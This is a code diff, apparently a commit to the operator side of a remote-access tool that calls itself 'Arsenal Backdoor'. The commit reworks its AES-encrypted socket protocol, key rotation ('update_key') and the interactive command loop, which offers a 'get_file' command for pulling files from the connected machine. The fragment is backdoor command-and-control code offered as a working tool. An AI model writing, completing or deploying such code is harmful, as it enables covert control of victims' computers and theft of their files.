@@ -18,10 +18,9 @@ def update_aeskeys():
     tmpkey, tmpiv = aeskey, aesiv
     aeskey = os.urandom(32)
     aesiv = os.urandom(16)
-    return bytes(str([ b'aeskey', aeskey, aesiv ]), 'utf-8'), tmpkey, tmpiv
+    return do_encrypt(bytes(str([ b'aeskey', aeskey, aesiv ]), 'utf-8'), tmpkey, tmpiv)
 
 def do_encrypt(message, tmpkey=aeskey, tmpiv=aesiv):
-    print(tmpkey, tmpiv)
     if isinstance(message, bytes):
         pass
     else:
@@ -50,17 +49,15 @@ def get_data(conn, buff):
         data += conn.recv(buff if to_read > buff else to_read)
     return data
 
-def sendit(conn, output):
-    message = do_encrypt(output)
-    print(message)
+def sendit(conn, message):
     length = struct.pack('>Q', len(message))
     conn.sendall(length)
     conn.sendall(message)
 
 def client(conn, addr, buff):
-    conn.send(do_encrypt('Arsenal Backdoor'))
+    sendit(conn, do_encrypt('Arsenal Backdoor'))
     while True:
-        data = get_data(conn)
+        data = get_data(conn, buff)
         if data == 0:
             break
         print('\n'+str(do_decrypt(data).strip(), 'utf-8'))
@@ -72,8 +69,7 @@ def client(conn, addr, buff):
             if reply == 'help':
                 print('update_key\nget_file /path/to/file')
             elif reply == "update_key":
-                foo,bar,bat = update_aeskeys()
-                sendit(conn, do_encrypt(foo, bar, bat))
+                sendit(conn, update_aeskeys())
             elif reply.strip() == '':
                 continue
             else:
